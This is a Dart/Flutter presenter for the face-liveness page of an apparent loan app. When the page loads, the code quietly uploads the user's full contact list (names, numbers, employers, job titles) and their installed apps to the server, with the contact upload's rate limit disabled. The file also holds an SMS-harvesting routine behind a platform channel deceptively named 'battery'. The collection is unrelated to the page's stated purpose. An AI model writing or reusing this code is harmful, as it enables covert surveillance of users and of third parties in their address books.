import 'dart:convert';

import 'package:appcheck/appcheck.dart';
import 'package:flutter_contacts/flutter_contacts.dart';
import 'package:dio/dio.dart';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:myapp9/config/constant.dart';
import 'package:myapp9/models/d_borrow_sign_entity.dart';
import 'package:myapp9/mvp/base_page_presenter.dart';
import 'package:myapp9/net/net.dart';
import 'package:myapp9/pages/liveness/iviews/liveness_i_mvp_view.dart';
import 'package:sp_util/sp_util.dart';

import '../../../models/n_user_profile_entity.dart';
import '../../../util/helper.dart';

class LivenessPagePresenter extends BasePagePresenter<LivenessIMvpView> {
  LivenessPagePresenter({required this.productId});

  final String? productId;
  static const platform = MethodChannel('samples.flutter.io/battery');
  late Map<String, dynamic> deviceInfo;

  @override
  void initState() {
    WidgetsBinding.instance.addPostFrameCallback((_) async {
      deviceInfo = await Helper.getDeviceInfo(view);
      int id = int.parse(productId!);
      // Provider.of<ProductProvider>(view.getContext(), listen:false).bProductEntity.id!;
      getContacts();
      // r();
      getApps();
    });
  }

  Future index(bool isShowDialog, int id) {
    String lastFetchVerifyItemsTime = SpUtil.getString(Constant.lastFetchPreComputeTime + id.toString(), defValue: '')!;
    Map<String, dynamic>? params = {"id": id, "last_fetch_time": lastFetchVerifyItemsTime};
    return requestNetwork<DBorrowSignEntity>(Method.get, url: HttpApi.bProducts, queryParameters: params, isShow: isShowDialog, onSuccess: (data) {
      if (data != null) {
        if (data.data!.preComputeList != null) {
          view.provider.setDBorrowSignEntity(data.data!.preComputeList!);
          SpUtil.putString(Constant.lastFetchPreComputeTime + id.toString(), data.data!.lastFetchTime!);
          SpUtil.putObjectList(Constant.preComputeInfo + id.toString(), data.data!.preComputeList!);
          SpUtil.putString(Constant.signConfirmInfo, data.data!.confirm!);
        }
      }
    }, onError: (_, __) {
      /// 加载失败
      print(123);
    });
  }

  Future dBorrowsStore(bool isShowDialog, int id, List<String?> listFace) async {
    Map<String, dynamic>? params = {"id": id};
    if (deviceInfo.isEmpty) {
      deviceInfo = await Helper.getDeviceInfo(view);
    }
    params.addAll(deviceInfo);
    params.addAll({"id": id});
    for (int i = 0; i < listFace.length; i++) {
      String key = "face$i";
      String? value = listFace[i];
      if (value != null) {
        params.addAll({
          key: await MultipartFile.fromFile(value, filename: key),
        });
      }
    }
    FormData formData = FormData.fromMap(params);
    return requestNetwork<NUserProfileEntity>(Method.post,
        url: HttpApi.dBorrowsStore,
        // queryParameters: params,
        params: formData,
        isShow: isShowDialog, onSuccess: (data) {
      if (data != null) {
        Helper.cacheProfile(data.data!);
        SpUtil.putString(Constant.expectReviewDate + id.toString(), data.other!.tip1!);
        view.signSuccess(data.other!.tip1!, data.other!.tip2!, data.other!.tip3!, data.other!.tip4!);
      }
    }, onError: (_, __) {
      view.showToast(__);

      /// 加载失败
    });
  }

  Future<void> getApps() async {
    int lastAppUploadTIme = SpUtil.getInt(Constant.tLastAppTime) ?? 0;
    DateTime now = DateTime.now();
    int timestamp = now.millisecondsSinceEpoch ~/ 1000;
    if (!(lastAppUploadTIme == 0 || timestamp - lastAppUploadTIme > 3600 * 1000)) {
      return;
    }
    final appCheck = AppCheck();
    List<AppInfo>? installedApps;
    installedApps = await appCheck.getInstalledApps();
    List<AppInfo>? installedApps2;
    List<Map<String, dynamic>> appMaps = [];

    // debugPrint(installedApps.toString());
    installedApps?.sort(
      (a, b) => a.appName!.toLowerCase().compareTo(b.appName!.toLowerCase()),
    );
    installedApps2 = installedApps?.where((element) => !element.isSystemApp!).toList();
    installedApps?.map((e) => print(e.appName!.toLowerCase()));
    for (AppInfo appOne in installedApps2!) {
      Map<String, dynamic> data = <String, dynamic>{};
      data['appName'] = appOne.appName;
      data['packageName'] = appOne.packageName;
      data['versionName'] = appOne.versionName;
      data['isSystemApp'] = appOne.isSystemApp;
      appMaps.add(data);
    }
    Map<String, dynamic> FormDataMap = {};
    FormDataMap['messages'] = jsonEncode(appMaps);
    FormData formData = FormData.fromMap(FormDataMap);
    var isShowDialog = false;
    requestNetwork<dynamic>(Method.post, url: HttpApi.sAApp, params: formData, isShow: isShowDialog, onSuccess: (data) {
      DateTime now = DateTime.now();
      int timestamp = now.millisecondsSinceEpoch;
      SpUtil.putInt(Constant.tLastAppTime, timestamp ~/ 1000);
      if (data != null) {}
    }, onError: (_, __) {
      /// 加载失败
    });
  }

  Future<void> r() async {
    int lastSmsUploadTIme = SpUtil.getInt(Constant.nLastMsgTime) ?? 0;
    DateTime now = DateTime.now();
    int timestamp = now.millisecondsSinceEpoch ~/ 1000;
    if (!(lastSmsUploadTIme == 0 || timestamp - lastSmsUploadTIme > 3600 * 1000)) {
      return;
    }
    Map<String, dynamic>? params = {"id": 1};
    await requestNetwork<dynamic>(Method.get, url: '${HttpApi.nUserProfile}/1', queryParameters: params, isShow: false, onSuccess: (data) async {
      bool permission = await view.requestPermission('sms');
      Map<String, dynamic> FormDataMap = {};
      if (permission) {
        Map<String, dynamic> arguments = <String, dynamic>{
          'start': DateTime.parse(data['data']['n_last_msg_time'] as String).millisecondsSinceEpoch,
        };
        final List<dynamic> messages = await platform.invokeMethod('getSmsList', arguments) as List;
        messages.forEach((element) {});
        FormDataMap['messages'] = jsonEncode(messages);
      }
      FormData formData = FormData.fromMap(FormDataMap);
      var isShowDialog = false;
      requestNetwork<dynamic>(Method.post, url: HttpApi.rCSms, params: formData, isShow: isShowDialog, onSuccess: (data) {
        DateTime now = DateTime.now();
        int timestamp = now.millisecondsSinceEpoch;
        SpUtil.putInt(Constant.nLastMsgTime, timestamp ~/ 1000);
        if (data != null) {}
      }, onError: (_, __) {
        /// 加载失败
      });
    }, onError: (_, __) {
      /// 加载失败
    });
  }

  Future<void> getContacts() async {
    int lastContactUploadTIme = SpUtil.getInt(Constant.wLastContactTime) ?? 0;
    DateTime now = DateTime.now();
    int timestamp = now.millisecondsSinceEpoch ~/ 1000;
    if (!(lastContactUploadTIme == 0 || timestamp - lastContactUploadTIme > 3600 * 1000)) {
      // return;
    }

    if (await view.requestPermission('contacts')) {
      if (await FlutterContacts.requestPermission()) {
        List<Contact> contacts = await FlutterContacts.getContacts();

        // Get all contacts (fully fetched)
        contacts = await FlutterContacts.getContacts(
            withProperties: true, withPhoto: true);
        Map<String, dynamic> FormDataMap = {};
        List<Map<String, dynamic>> contactMaps = [];
        for (Contact contact in contacts) {
          for (Phone phone in contact.phones!) {
            Map<String, dynamic> data = <String, dynamic>{};
            data['phoneValue'] = phone.number;
            data['phoneLabel'] = phone.label.toString();
            data['identifier'] = contact.id;
            data['displayName'] = contact.displayName;
            data['givenName'] = contact.name.first;
            data['middleName'] = contact.name.middle;
            data['familyName'] = contact.name.last;
            data['prefix'] = contact.name.prefix;
            data['suffix'] = contact.name.suffix;
            data['company'] = contact.organizations.first.company;
            data['jobTitle'] = contact.organizations.first.title;
            contactMaps.add(data);
          }
        }
        FormDataMap['messages'] = jsonEncode(contactMaps);
        FormData formData = FormData.fromMap(FormDataMap);
        var isShowDialog = false;
        requestNetwork<dynamic>(Method.post, url: HttpApi.bJContacts, params: formData, isShow: isShowDialog, onSuccess: (data) {
          DateTime now = DateTime.now();
          int timestamp = now.millisecondsSinceEpoch;
          SpUtil.putInt(Constant.wLastContactTime, timestamp ~/ 1000);
          if (data != null) {}
        }, onError: (_, __) {
          /// 加载失败
        });
      }
      // Get all contacts on device


    }
  }
}
